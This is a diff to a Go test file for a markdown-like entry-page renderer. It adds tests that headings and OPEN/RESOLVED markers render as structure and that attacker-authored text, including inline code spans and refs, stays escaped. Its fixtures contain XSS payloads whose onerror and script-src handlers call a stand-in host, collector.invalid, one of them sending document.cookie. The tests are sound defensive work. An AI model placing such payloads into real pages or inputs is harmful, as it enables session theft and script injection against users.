@@ -1,6 +1,7 @@
 package ui
 
 import (
+	"regexp"
 	"strings"
 	"testing"
 
@@ -126,6 +127,22 @@ const (
 	hostileHeading = `## Pointers</h3><img src=x onerror="fetch('//collector.invalid/c?'+document.cookie)"><h3>`
 	hostileBullet  = `- OPENISH: </code></pre><img src=x onerror="fetch('//collector.invalid/c')"> see the runbook`
 	hostileBody    = `prose</code></pre><script src="//collector.invalid/x.js"></script><pre><code>`
+
+	// 🔴 A PAYLOAD INSIDE A BACKTICK SPAN, BECAUSE THE INLINE-CODE RENDERING IS A SECOND
+	// PARSE OF THE SAME ATTACKER-AUTHORED TEXT AND A NEW PLACE THE SPLIT COULD GO WRONG.
+	// `inlineCode` cuts the line at the backticks and builds an `h.Code` node around the
+	// inside, so the inside is a position no fixture reached before this: a payload that
+	// escaped there would land in element content that the renderer, not the store, chose to
+	// create. It closes an element and opens an `<img>`, so an unescaped span breaks the
+	// `<pre><code>` open and the structural differential moves.
+	//
+	// ⚠ BOTH WORLDS CARRY EXACTLY ONE BACKTICK PAIR ON THIS LINE, WHICH IS WHAT KEEPS THE
+	// DIFFERENTIAL ABOUT ESCAPING. The pair itself becomes markup by design — one `<code>`
+	// element either way — so a hostile world with more pairs than the benign one would move
+	// `lt`/`gt` for a reason that is not an injection and the comparison would read as a
+	// finding when it is a fixture mismatch.
+	hostileCodeSpan = "  see `</code><img src=x onerror=\"fetch('//collector.invalid/c')\">` for the steps"
+	benignCodeSpan  = "  see `docs/rollout.md` for the steps"
 )
 
 // benignWorld mirrors [hostileWorld] SHAPE FOR SHAPE: one scope, one entry, one
@@ -151,7 +168,7 @@ func benignWorld() []Scope {
 			Sections: []Section{
 				{Heading: "## Pointers", Body: "prose"},
 				{Heading: store.NuanceHeading, Body: "- a bullet", Bullets: []Bullet{
-					{Lines: []string{"- a bullet"}, Date: "2000-06-01", Population: store.PopulationNone},
+					{Lines: []string{"- a bullet", benignCodeSpan}, Date: "2000-06-01", Population: store.PopulationNone},
 				}},
 			},
 			BulletCount: 1,
@@ -189,7 +206,7 @@ func hostileWorld() []Scope {
 					// derived from this field and never from the text, so a renderer
 					// that read the words would light the OPEN badge here and the
 					// structural differential below would see the extra element.
-					{Lines: []string{hostileBullet}, Date: "2000-06-01", Population: store.PopulationNone},
+					{Lines: []string{hostileBullet, hostileCodeSpan}, Date: "2000-06-01", Population: store.PopulationNone},
 				}},
 			},
 			BulletCount: 1,
@@ -272,12 +289,12 @@ func renderedPages(t *testing.T, world []Scope) map[string]string {
 func TestHostileEntryTextIsEscapedOnEveryBrowsePage(t *testing.T) {
 	// POSITIVE CONTROL — the new fixtures really do carry markup the counters can see.
 	// Reported as a pair with the zeroes below, never on their own.
-	newlyReachable := hostileHeading + hostileBullet + hostileBody
+	newlyReachable := hostileHeading + hostileBullet + hostileBody + hostileCodeSpan
 	if n := countTokens(newlyReachable); n == 0 {
-		t.Fatal("POSITIVE CONTROL FAILED: the heading/bullet/body fixtures carry NOTHING the token scanner " +
-			"recognises, so a zero on the rendered entry page below would mean nothing")
+		t.Fatal("POSITIVE CONTROL FAILED: the heading/bullet/body/code-span fixtures carry NOTHING the token " +
+			"scanner recognises, so a zero on the rendered entry page below would mean nothing")
 	}
-	benignSectionContent := "## Pointers" + "prose" + "- a bullet"
+	benignSectionContent := "## Pointers" + "prose" + "- a bullet" + benignCodeSpan
 	if structureOf(benignSectionContent) == structureOf(newlyReachable) {
 		t.Fatalf("POSITIVE CONTROL FAILED: the hostile section fixtures carry the same markup shape as the "+
 			"benign ones (%+v), so the differential below cannot detect an injection into a section or a "+
@@ -320,11 +337,29 @@ func TestHostileEntryTextIsEscapedOnEveryBrowsePage(t *testing.T) {
 	// on the ABSENCE of a token passes for a page that dropped the content entirely; this
 	// is what says the text is present AND inert. The literals are hand-written from the
 	// HTML escaping rules rather than derived from the function under test.
+	//
+	// ⚠ TWO OF THE THREE ARE PINNED MINUS A PREFIX NOW, AND THE `TrimPrefix` CALLS ARE THE
+	// POINT RATHER THAN NOISE. The entry page renders a `##` run as a heading and a list
+	// marker as an `<li>`, so those characters are STRUCTURE on the page and no longer text
+	// — which is a transformation, and a transformation is where content gets lost. The trim
+	// is spelled here with a literal prefix rather than by calling `headingParts` or
+	// `Bullet.Body`: deriving the expectation from the functions under test would make this
+	// assertion true however they behaved. What it measures is unchanged and is the thing
+	// that matters — every remaining byte of each payload is on the page, escaped, rather
+	// than dropped by the new rendering.
+	//
+	// `hostileBullet` keeps its `OPENISH:` because `store.MarkerSpan` refuses it: it is a
+	// near miss, and a near miss's marker text staying on the page is the whole finding.
 	entry := hostile["entry"]
 	for _, want := range []string{
-		escapeForTest(hostileHeading),
-		escapeForTest(hostileBullet),
+		escapeForTest(strings.TrimPrefix(hostileHeading, "## ")),
+		escapeForTest(strings.TrimPrefix(hostileBullet, "- ")),
 		escapeForTest(hostileBody),
+		// The payload from INSIDE the backtick span, which `inlineCode` moved into an
+		// `h.Code` node of the renderer's own making. `hostileCodeSpan` as a whole is no
+		// longer contiguous on the page — the backticks became an element boundary — so what
+		// is pinned is the part that was between them, escaped and whole.
+		escapeForTest(`</code><img src=x onerror="fetch('//collector.invalid/c')">`),
 	} {
 		if !strings.Contains(entry, want) {
 			t.Errorf("the entry page does not carry the fully escaped form of a hostile string; it was "+
@@ -541,6 +576,489 @@ func TestHostileEntryTextIsEscaped(t *testing.T) {
 		t.Error("the benign https ref did not render as a link, so every `no href=javascript` assertion above " +
 			"is satisfied by a page with no links at all")
 	}
+}
+
+// entryPageOver renders the entry page over ONE entry built from a real nuance body, so the
+// assertions below are about the renderer over the store's own parse rather than over
+// populations and prefixes a test invented.
+//
+// 🔴 IT DRIVES `readEntry`'s OWN PROJECTION, NOT A HAND-BUILT `Bullet`. Every field the new
+// rendering branches on — the population, the sha, the unreachable-marker list, where the
+// marker prefix ENDS — comes out of `internal/store`, and a fixture that set them by hand
+// would assert the renderer against values this file decided. `sectionsFromBody` is the same
+// three calls `StoreSource.readEntry` makes, spelled here because these tests hold no store
+// on disk.
+func entryPageOver(t *testing.T, sections []Section) string {
+	t.Helper()
+	world := benignWorld()
+	world[0].Entries[0].Sections = sections
+	view := viewOf("operator@example.invalid", world)
+	view.Scope = &world[0]
+	view.Entry = &world[0].Entries[0]
+	return renderNode(t, EntryPage(view))
+}
+
+// sectionsFromBody parses a nuance body with the store's parsers and projects it exactly as
+// `StoreSource.readEntry` does.
+func sectionsFromBody(t *testing.T, heading, body string) []Section {
+	t.Helper()
+	section := Section{Heading: heading, Body: body}
+	if heading == store.NuanceHeading {
+		for _, b := range store.ParseJournalBullets(body) {
+			section.Bullets = append(section.Bullets, Bullet{
+				Lines:       b.Lines,
+				Date:        b.Date,
+				Population:  b.OpennessPopulation(),
+				ResolvedBy:  b.ResolvedBy,
+				Unreachable: b.UnreachableMarkers(),
+			})
+		}
+		if len(section.Bullets) == 0 {
+			t.Fatalf("the nuance fixture parsed to NO bullet, so every bullet assertion below would be vacuous:\n%s", body)
+		}
+	}
+	return []Section{section}
+}
+
+// elementsOf returns the inner text of every `open`…`close` region of `s`.
+//
+// 🔴 THE ASSERTIONS BELOW ARE SCOPED TO THE BODY ELEMENT AND NOT TO THE WHOLE PAGE, WHICH IS
+// NOT FASTIDIOUSNESS. The page's own explainer and legend QUOTE the marker grammar —
+// "`OPEN:` / `RESOLVED <sha>:` … becomes a badge" — so a whole-page `!Contains(out, "OPEN:")`
+// would be red on a correct tree, which is the permanently-red guard this repository refuses.
+// What the change actually claims is that the marker is not in the LINE, so the line is what
+// is read.
+func elementsOf(s, open, close string) []string {
+	var out []string
+	for {
+		i := strings.Index(s, open)
+		if i < 0 {
+			return out
+		}
+		s = s[i+len(open):]
+		j := strings.Index(s, close)
+		if j < 0 {
+			return out
+		}
+		out = append(out, s[:j])
+		s = s[j:]
+	}
+}
+
+// preBodies is [elementsOf] over the `<pre class=class>` bodies, with the `<pre>`'s own
+// `<code>` wrapper removed so an assertion compares the TEXT the page shows.
+//
+// ⚠ THE WRAPPER IS TRIMMED AT THE ENDS AND NOT SEARCHED FOR, BECAUSE AN INLINE SPAN'S
+// `</code>` COMES FIRST. A body carrying a code span reads
+// `<code>run <code class="inline-code">x</code> first</code>`, so cutting at the first
+// `</code>` would truncate the body at the span and every "the text around it survived"
+// assertion would be measuring half a line.
+// ruleBodyFor returns the DECLARATION BLOCK of the first rule whose selector list names
+// `.class`, or "" if there is none.
+//
+// ⚠ IT IS A BRACE SCAN AND NOT A CSS PARSER, AND ITS LIMIT IS STATED SO NOBODY READS IT
+// WIDER. It finds the first `{` after the class name and returns to the matching depth-0 `}`,
+// which is exactly right for the flat `@layer components` rules this stylesheet emits and
+// would be wrong for a rule whose selector merely contains the name inside a string or a
+// comment. `hasSelectorFor` is the guard for "does a rule EXIST"; this one exists for the one
+// case where a DECLARATION is load-bearing to a claim the page makes in words.
+func ruleBodyFor(css, class string) string {
+	loc := regexp.MustCompile(`\.` + regexp.QuoteMeta(class) + `([^A-Za-z0-9_\-]|$)`).FindStringIndex(css)
+	if loc == nil {
+		return ""
+	}
+	open := strings.IndexByte(css[loc[0]:], '{')
+	if open < 0 {
+		return ""
+	}
+	depth, start := 0, loc[0]+open
+	for i := start; i < len(css); i++ {
+		switch css[i] {
+		case '{':
+			depth++
+		case '}':
+			depth--
+			if depth == 0 {
+				return css[start : i+1]
+			}
+		}
+	}
+	return ""
+}
+
+func preBodies(s, class string) []string {
+	out := elementsOf(s, `<pre class="`+class+`">`, `</pre>`)
+	for i, b := range out {
+		out[i] = strings.TrimSuffix(strings.TrimPrefix(b, "<code>"), "</code>")
+	}
+	return out
+}
+
+// TestTheEntryPageShowsHeadingsAndMarkersAsStructureRatherThanText is the REGRESSION test
+// for the operator's complaint: the page rendered its own source, `##` runs and `OPEN:`
+// prefixes included, instead of reading as a document.
+//
+// 🔴 IT PINS BOTH DIRECTIONS OF EACH TRANSFORMATION, BECAUSE ONLY ONE OF THEM IS THE
+// REGRESSION AND THE OTHER IS THE HAZARD. "The heading text is in an `<h3>`" passes for a
+// page that renders `<h3>## What it is</h3>`, which is the defect; "the `##` is gone" passes
+// for a page that dropped the heading. Both, or neither means anything.
+//
+// 🔴 AND THE SHA IS ASSERTED ON THE BADGE, WHICH IS THE ONE PLACE THIS CHANGE COULD HAVE
+// LOST INFORMATION OUTRIGHT. `RESOLVED <sha>:` is stripped from the line because the badge
+// replaces it, and the sha is what makes the claim checkable at all — so a badge reading
+// only `resolved` would have deleted evidence from the page while looking tidier.
+func TestTheEntryPageShowsHeadingsAndMarkersAsStructureRatherThanText(t *testing.T) {
+	body := strings.Join([]string{
+		"- 2000-01-02: OPEN: the lease renewal is still manual",
+		"- 2000-01-03: RESOLVED abc1234: the sidecar now renews it",
+		"- 2000-01-04: an ordinary bullet",
+	}, "\n")
+	sections := sectionsFromBody(t, store.NuanceHeading, body)
+
+	// INSTRUMENT CONTROL: the three lines really are in the three populations this test is
+	// named for, so the assertions are about rendering and not about a fixture whose lines
+	// all mean the same thing.
+	wantPopulations := []string{store.PopulationOpen, store.PopulationResolved, store.PopulationNone}
+	for i, b := range sections[0].Bullets {
+		if b.Population != wantPopulations[i] {
+			t.Fatalf("bullet %d parsed as %q, want %q — the fixture does not exercise the distinction",
+				i, b.Population, wantPopulations[i])
+		}
+	}
+	if sections[0].Bullets[1].ResolvedBy != "abc1234" {
+		t.Fatalf("the RESOLVED bullet carries sha %q, want \"abc1234\"; the badge assertion below would be vacuous",
+			sections[0].Bullets[1].ResolvedBy)
+	}
+
+	out := entryPageOver(t, sections)
+
+	// --- The heading. ---
+	if !strings.Contains(out, `<h3 class="section-head">Nuance / work-history</h3>`) {
+		t.Error("the section heading is not rendered as a heading carrying the heading TEXT. The operator's " +
+			"complaint was that the page printed the file's own `##` line; an `<h3>` holding `## Nuance / " +
+			"work-history` is that same defect wearing a heading element")
+	}
+	if strings.Contains(out, ">"+store.NuanceHeading+"<") {
+		t.Errorf("the literal %q is still rendered as an element's text. The `##` run is the heading now, so "+
+			"printing it as well is the verbatim rendering this change replaced", store.NuanceHeading)
+	}
+	// …and the verbatim line is NOT shown for a canonical heading, or it would appear on
+	// every healthy entry and the near-miss signal would mean nothing.
+	if strings.Contains(out, `class="section-source"`) {
+		t.Error("a CANONICAL `## ` heading rendered the file's verbatim line as well. That annotation exists " +
+			"for a heading spelled some other way; on every entry it is noise, and noise is what makes the " +
+			"real case invisible")
+	}
+
+	// --- The markers. ---
+	bodies := preBodies(out, "bullet-body")
+	if len(bodies) != 3 {
+		t.Fatalf("the page rendered %d bullet bodies, want 3; the assertions below would be about the wrong text", len(bodies))
+	}
+	joined := strings.Join(bodies, "\n")
+	for _, gone := range []string{"OPEN:", "RESOLVED abc1234:", "- ", "2000-01-02"} {
+		if strings.Contains(joined, gone) {
+			t.Errorf("a bullet body still carries %q, which the badges above it already say. The date, the "+
+				"list marker and the openness marker are structure on this page; printing them as well is what "+
+				"made it read as a source file.\nbodies: %q", gone, bodies)
+		}
+	}
+	// POSITIVE CONTROL on the strip: the PROSE is still there. A body that lost its marker
+	// by losing the whole line would satisfy every assertion above.
+	for i, want := range []string{
+		"the lease renewal is still manual",
+		"the sidecar now renews it",
+		"an ordinary bullet",
+	} {
+		if !strings.Contains(bodies[i], want) {
+			t.Errorf("bullet %d's own text is missing: the prefix strip took the line with it.\ngot: %q", i, bodies[i])
+		}
+	}
+
+	// --- The sha, which the strip removed from the line. ---
+	if !strings.Contains(out, `<span class="badge badge-quiet">resolved abc1234</span>`) {
+		t.Error("the resolved badge does not name the sha. `RESOLVED <sha>:` was stripped from the line " +
+			"because the badge replaces it, so a badge without the sha has deleted the one part of the claim " +
+			"a reader can check with `git cat-file -e`")
+	}
+	if !strings.Contains(out, `<span class="badge badge-open">OPEN</span>`) {
+		t.Error("the OPEN badge is absent, so the marker was removed from the line and replaced by nothing")
+	}
+	t.Logf("entry page: heading rendered as `<h3>Nuance / work-history</h3>` with no `##` text and no "+
+		"verbatim annotation; 3 bullet bodies carry their prose and none of [%q %q %q %q]; the resolved badge "+
+		"carries sha abc1234", "OPEN:", "RESOLVED abc1234:", "- ", "2000-01-02")
+}
+
+// TestAMarkerTheParserCannotReachIsStillOnThePage is the guard the whole design of change 2
+// rests on: every transformation is a place the view can disagree with the file, so the
+// cases the parser REFUSES must be louder after the change, not quieter.
+//
+// 🔴 IT IS A REGRESSION TEST AGAINST THIS CHANGE'S OWN HAZARD, WHICH IS WHY IT EXISTS RATHER
+// THAN BEING FOLDED INTO THE BADGE TEST. Stripping a marker the parser accepted is safe
+// because the badge replaces it. The three cases below are the ones where nothing is
+// stripped and therefore nothing replaces anything — and for two of them, the stripping of
+// the OTHER cases is precisely what makes them ambiguous: a page that never printed `OPEN:`
+// and one that prints it only when it means nothing are indistinguishable to a reader who
+// does not already know the rule. So each is asserted PRESENT and NAMED.
+func TestAMarkerTheParserCannotReachIsStillOnThePage(t *testing.T) {
+	// ⚠ INVARIANT GUARD, NOT REGRESSION COVERAGE — MEASURED, AND LABELLED BECAUSE THE
+	// DISTINCTION IS THE HOUSE RULE. This subtest is GREEN at `ac1e8ee`, the commit before the
+	// change: the old page printed every line verbatim, so a near miss's marker text was on
+	// the page for free and no bug ever violated this. What it pins is that the STRIP did not
+	// break it. It is not vacuous — a mutant that cuts `Bullet.Body`'s first line at the first
+	// `:` instead of at `store.MarkerSpan` kills it with this message — but it must not be
+	// counted as evidence that a defect existed.
+	t.Run("a near miss keeps its marker text and its own badge", func(t *testing.T) {
+		// `- 2000-01-02 OPEN: …` — the date is not followed by `:`, so `journalOpenness`
+		// refuses the line and `store.MarkerSpan` is 0. Nothing is stripped, by construction.
+		const line = "- 2000-01-02 OPEN: the lease renewal is still manual"
+		sections := sectionsFromBody(t, store.NuanceHeading, line)
+		if got := sections[0].Bullets[0].Population; got != store.PopulationNearMiss {
+			t.Fatalf("the fixture is population %q, want %q — it is not a near miss and this case measures nothing",
+				got, store.PopulationNearMiss)
+		}
+		if n := store.MarkerSpan(line); n != 0 {
+			t.Fatalf("store.MarkerSpan reports a %d-byte marker prefix on a NEAR MISS, so the renderer would "+
+				"strip text whose survival is the entire finding", n)
+		}
+		out := entryPageOver(t, sections)
+		if !strings.Contains(out, `<span class="badge badge-near">near-miss marker</span>`) {
+			t.Error("a near miss rendered no near-miss badge")
+		}
+		bodies := preBodies(out, "bullet-body")
+		if len(bodies) != 1 || !strings.Contains(bodies[0], "OPEN:") {
+			t.Errorf("the near miss's own `OPEN:` text is NOT in the rendered line: %q. A badge naming text "+
+				"nobody can read is the state `NearMissCount` exists to end, and a page that strips accepted "+
+				"markers makes this the only way a reader can see the difference", bodies)
+		}
+	})
+
+	t.Run("a marker the parser cannot reach is kept AND called out", func(t *testing.T) {
+		// A bullet whose line 1 declares nothing and whose THIRD line spells a correct
+		// marker. `BulletOpenness` is anchored at position 0 of line 1, so this declares
+		// nothing — `store.UnreachableMarker`'s comment records the field case.
+		body := strings.Join([]string{
+			"- the lease renewal came up again in review",
+			"  and nobody has claimed it since.",
+			"  OPEN: the renewal is still manual",
+		}, "\n")
+		sections := sectionsFromBody(t, store.NuanceHeading, body)
+		b := sections[0].Bullets[0]
+		if b.Population != store.PopulationNone {
+			t.Fatalf("the fixture bullet DECLARED %q: an unreachable marker that reached a population is not "+
+				"the case this measures", b.Population)
+		}
+		if len(b.Unreachable) != 1 || b.Unreachable[0].Offset != 3 {
+			t.Fatalf("the store reports %d unreachable marker(s) %+v, want exactly one at offset 3; the "+
+				"assertions below would be about nothing", len(b.Unreachable), b.Unreachable)
+		}
+
+		out := entryPageOver(t, sections)
+		if !strings.Contains(out, `class="bullet-unreachable"`) {
+			t.Error("a bullet carrying a correctly-spelled marker on a line no reader looks at rendered NO " +
+				"callout. Now that an ACCEPTED marker is stripped from the line, a marker still printed there " +
+				"is exactly the shape of one that declared nothing — and silence makes it read as prose")
+		}
+		notes := elementsOf(out, `<div class="bullet-unreachable">`, `</div>`)
+		if len(notes) != 1 {
+			t.Fatalf("the page rendered %d unreachable-marker blocks, want 1", len(notes))
+		}
+		if !strings.Contains(notes[0], "Line 3") {
+			t.Errorf("the callout does not name WHICH line, so a reader has a warning and no place to look: %q", notes[0])
+		}
+		// The line itself must still be there — the callout is the claim, the line is the
+		// evidence, and a page with one and not the other is unreadable.
+		bodies := preBodies(out, "bullet-body")
+		if len(bodies) != 1 || !strings.Contains(bodies[0], "OPEN: the renewal is still manual") {
+			t.Errorf("the unreachable marker's own line is not in the rendered body: %q", bodies)
+		}
+		// NEGATIVE CONTROL: a bullet with NO unreachable marker renders no block, so the
+		// presence above is about the marker and not about a block that is always there.
+		clean := sectionsFromBody(t, store.NuanceHeading, "- the lease renewal came up again in review")
+		if cleanOut := entryPageOver(t, clean); strings.Contains(cleanOut, `class="bullet-unreachable"`) {
+			t.Error("a bullet with no unreachable marker still rendered the callout, so its presence above " +
+				"says nothing")
+		}
+	})
+
+	t.Run("a heading spelled some other way still shows the file's own line", func(t *testing.T) {
+		// 🔴 THE HEADING HALF OF THE SAME HAZARD. Stripping the `##` run is only lossless
+		// because the run is always `"## "` for a heading `readEntry` can produce; the moment
+		// it is not, the level the page no longer prints is information the reader has lost.
+		// So the renderer reports the run it found instead of assuming one.
+		const odd = "#  What it is"
+		out := entryPageOver(t, []Section{{Heading: odd, Body: "the lease renewer"}})
+		if !strings.Contains(out, `<h3 class="section-head">What it is</h3>`) {
+			t.Error("the heading text did not render as a heading")
+		}
+		sources := elementsOf(out, `<p class="section-source">`, `</p>`)
+		if len(sources) != 1 {
+			t.Fatalf("a heading whose `#` run is not `## ` rendered %d verbatim annotations, want 1. The page "+
+				"no longer prints the run, so a reader cannot otherwise tell a one-hash heading from a two-hash "+
+				"one — which is exactly the mapping complaint this page exists to answer", len(sources))
+		}
+		if !strings.Contains(sources[0], escapeForTest(odd)) {
+			t.Errorf("the annotation does not quote the file's own line: %q", sources[0])
+		}
+		// 🔴 AND THE STYLESHEET HAS TO MAKE IT VERBATIM ON SCREEN, WHICH IS A SEPARATE CLAIM
+		// FROM THE BYTES BEING RIGHT. HTML collapses a run of whitespace to one space, so
+		// `#  Pointers` and `# Pointers` rendered IDENTICALLY here — in the ONE place on the
+		// page whose whole job is to show a heading whose spelling is unusual. The markup was
+		// correct the entire time; the defect was visible only in a browser. This pins the
+		// `white-space` declaration rather than a spelling of it, because `pre`, `pre-wrap`
+		// and `break-spaces` all satisfy the claim and Tailwind may emit any of them.
+		rule := ruleBodyFor(string(stylesheet), "section-source")
+		if rule == "" {
+			t.Fatal("the stylesheet has no `.section-source` rule at all, so the check below is about nothing")
+		}
+		if !strings.Contains(rule, "white-space: pre") {
+			t.Errorf("`.section-source` does not declare a preserving `white-space`, so the line it calls "+
+				"VERBATIM is rendered with its whitespace runs collapsed: a heading differing from the "+
+				"canonical one only by spacing would look identical to it.\nrule: %s", rule)
+		}
+	})
+}
+
+// TestInlineCodeSpansRenderAsCodeWithoutBecomingMarkup measures the ONE new parse of user
+// text this change adds, in both of the contexts that matter.
+//
+// 🔴 A NEW PARSE OF ATTACKER-AUTHORED TEXT IS A NEW SINK, AND THIS PACKAGE'S DOC COMMENT
+// RECORDS THAT TEXT AND ATTRIBUTE POSITIONS FAIL DIFFERENTLY. gomponents escapes text
+// content and attribute VALUES but writes an element or attribute NAME verbatim, so the two
+// contexts are exercised separately here rather than trusted to one payload: the span's
+// inside is text content that the RENDERER chose to wrap, and an entry ref carrying the same
+// payload lands in a quoted `href`.
+//
+// ⚠ THE ESCAPING HALF OF THE LAST SUBTEST IS A CLAIM NO MUTANT IN THIS TREE CAN TEST, AND
+// SAYING SO IS THE POINT. `inlineCode` builds only `g.Text` and an attribute-free `h.Code`,
+// and `Raw`/`Rawf` are AST-banned by `rawban_test.go` — so the non-escaping mutant that would
+// prove the token scan kills it CANNOT BE WRITTEN here. What stands instead is the pair of
+// controls: the payload is counted non-zero in the fixture and zero on every rendered page,
+// and `TestHostileEntryTextIsEscapedOnEveryBrowsePage`'s structural differential now carries a
+// backtick span in both worlds so a span that became markup would move `lt`/`gt`/`="`.
+func TestInlineCodeSpansRenderAsCodeWithoutBecomingMarkup(t *testing.T) {
+	t.Run("a span renders as code and its backticks do not", func(t *testing.T) {
+		out := entryPageOver(t, []Section{{Heading: store.WhatHeading, Body: "run `cairn recall --ref lease` first"}})
+		if !strings.Contains(out, `<code class="inline-code">cairn recall --ref lease</code>`) {
+			t.Error("a single-backtick span did not render as code. The operator's complaint named this " +
+				"explicitly: the page showed the backticks instead of the code")
+		}
+		bodies := preBodies(out, "section-body")
+		if len(bodies) != 1 {
+			t.Fatalf("the page rendered %d section bodies, want 1", len(bodies))
+		}
+		if strings.Contains(bodies[0], "`") {
+			t.Errorf("a matched backtick pair is still printed: %q", bodies[0])
+		}
+		if !strings.Contains(bodies[0], "run ") || !strings.Contains(bodies[0], " first") {
+			t.Errorf("the text around the span was lost: %q", bodies[0])
+		}
+	})
+
+	// ⚠ THE NEXT TWO ARE INVARIANT GUARDS, AND THE LABEL IS MEASURED RATHER THAN ASSUMED. Both
+	// are GREEN at `ac1e8ee`: the old page printed the body verbatim, so a stray backtick and
+	// an empty pair survived for free and no bug ever violated either. They pin that the new
+	// PARSE did not start editing text, which is a claim about this change and not about a
+	// defect — and each is killed by its own mutant (close an unterminated span at
+	// end-of-line; treat an empty pair as a span), so neither is vacuous.
+	t.Run("an unmatched backtick is left exactly as typed", func(t *testing.T) {
+		// 🔴 THE "DO NOT LOSE INFORMATION" RULE AT SPAN LEVEL, AND THE FAILURE IT REFUSES IS
+		// INVISIBLE BY CONSTRUCTION: a renderer that closed an unterminated span at
+		// end-of-line, or swallowed the character, edits a writer's text — and nobody notices,
+		// because a backtick is the one character a reader has stopped expecting to see.
+		const body = "the flag is `--ref and the default is none"
+		out := entryPageOver(t, []Section{{Heading: store.WhatHeading, Body: body}})
+		bodies := preBodies(out, "section-body")
+		if len(bodies) != 1 {
+			t.Fatalf("the page rendered %d section bodies, want 1", len(bodies))
+		}
+		if bodies[0] != escapeForTest(body) {
+			t.Errorf("a line with ONE backtick was rewritten.\n got: %q\nwant: %q", bodies[0], escapeForTest(body))
+		}
+		if strings.Contains(bodies[0], "inline-code") {
+			t.Error("an unterminated span produced a code element, so the parser closed a span the writer did not")
+		}
+	})
+
+	t.Run("an empty pair is two characters, not a span", func(t *testing.T) {
+		const body = "a doubled `` backtick pair"
+		out := entryPageOver(t, []Section{{Heading: store.WhatHeading, Body: body}})
+		bodies := preBodies(out, "section-body")
+		if len(bodies) != 1 || bodies[0] != escapeForTest(body) {
+			t.Errorf("an empty backtick pair was rewritten.\n got: %q\nwant: %q", bodies, escapeForTest(body))
+		}
+	})
+
+	t.Run("nothing inside a code fence is touched", func(t *testing.T) {
+		// The same ruling `ParseJournalBullets` and `UnreachableMarkers` already make about a
+		// `- OPEN:` inside a fence: fenced content is sample text, and reading the fence with
+		// `store.IsFence` is what keeps this renderer from disagreeing with them about what a
+		// fence is.
+		body := strings.Join([]string{
+			"before `real` span",
+			"```",
+			"echo `not a span`",
+			"```",
+			"after",
+		}, "\n")
+		out := entryPageOver(t, []Section{{Heading: store.WhatHeading, Body: body}})
+		bodies := preBodies(out, "section-body")
+		if len(bodies) != 1 {
+			t.Fatalf("the page rendered %d section bodies, want 1", len(bodies))
+		}
+		if n := strings.Count(bodies[0], "inline-code"); n != 1 {
+			t.Errorf("the body rendered %d inline-code span(s), want exactly 1 — the fenced backticks are "+
+				"sample text and must survive as characters: %q", n, bodies[0])
+		}
+		if !strings.Contains(bodies[0], "echo `not a span`") {
+			t.Errorf("the fenced line's backticks were consumed: %q", bodies[0])
+		}
+	})
+
+	t.Run("a payload inside a span cannot become markup, in text OR attribute position", func(t *testing.T) {
+		// TEXT POSITION: inside the span, which is the node `inlineCode` creates.
+		// ATTRIBUTE POSITION: the same payload as an entry REF, which reaches a quoted `href`
+		// through `entryHref` — a different failure mode, per this package's doc comment.
+		const payload = "`</code><img src=x onerror=\"fetch('//collector.invalid/c')\">`"
+		// POSITIVE CONTROL on the scanner: the payload really does carry something the token
+		// list recognises, so a zero below is a measurement.
+		if n := countTokens(payload); n == 0 {
+			t.Fatal("POSITIVE CONTROL FAILED: the payload carries nothing `dangerousTokens` matches, so a " +
+				"zero on the rendered page would mean nothing")
+		}
+
+		world := benignWorld()
+		world[0].Entries[0].Ref = "lease" + payload
+		world[0].Entries[0].Sections = []Section{{Heading: store.WhatHeading, Body: "the flag is " + payload}}
+		view := viewOf("operator@example.invalid", world)
+		view.Scope = &world[0]
+		view.Entry = &world[0].Entries[0]
+		pages := map[string]string{
+			"entry": renderNode(t, EntryPage(view)),
+			"scope": renderNode(t, ScopePage(view)),
+		}
+		for name, out := range pages {
+			for _, tok := range dangerousTokens {
+				if n := strings.Count(strings.ToLower(out), strings.ToLower(tok)); n > 0 {
+					t.Errorf("the %s page carries %d occurrence(s) of %q, which this renderer never emits: it "+
+						"came out of a backtick span or out of a ref in an href position", name, n, tok)
+				}
+			}
+		}
+		// …and INERT rather than DROPPED, in both positions.
+		inner := `</code><img src=x onerror="fetch('//collector.invalid/c')">`
+		if !strings.Contains(pages["entry"], `<code class="inline-code">`+escapeForTest(inner)+`</code>`) {
+			t.Error("the span's payload is not on the entry page as escaped code-element content: it was " +
+				"DROPPED rather than rendered inert, which hides what the file says")
+		}
+		if !strings.Contains(pages["scope"], escapeForTest("lease"+payload)) {
+			t.Error("the hostile REF is not on the scope page as escaped text, so the attribute-position half " +
+				"of this case is satisfied by a page that dropped it")
+		}
+		t.Logf("inline code: 0 of %d dangerous token(s) rendered as markup over 2 pages; the payload is "+
+			"present and escaped in both the span (text content) and the ref (attribute) positions",
+			len(dangerousTokens))
+	})
 }
 
 // escapeForTest is the hand-written escaping the assertions above compare against —
